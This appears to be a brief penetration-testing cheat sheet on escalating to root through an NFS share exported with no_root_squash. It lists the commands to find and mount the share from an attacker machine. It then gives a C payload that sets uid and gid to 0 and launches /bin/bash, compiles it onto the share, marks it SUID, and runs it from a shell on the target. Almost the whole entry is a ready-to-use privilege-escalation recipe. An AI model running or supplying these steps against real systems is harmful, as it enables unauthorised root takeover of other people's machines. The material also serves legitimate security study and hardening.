## NFS Root Squashing

`cat /etc/exports` then check for no root squash. That means that directory shareable and can be mounted.

In attacker machine `showmount -e <target_ip>` to see mountable folder.

`mkdir /tmp/mountme`
`mount -o  rw,vers=2 <target_ip>:mountable_folder /tmp/mountme`

Then we can mount malicous code to it. For example:
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c`

Now we can compile by,`gcc /tmp/mountme/x.c -o /tmp/mountme/x`

Then `chmod +s /tmp/mountme/x`

Then execute the x from target shell. `cd /sharefolder/` and `./x`. This will give root access.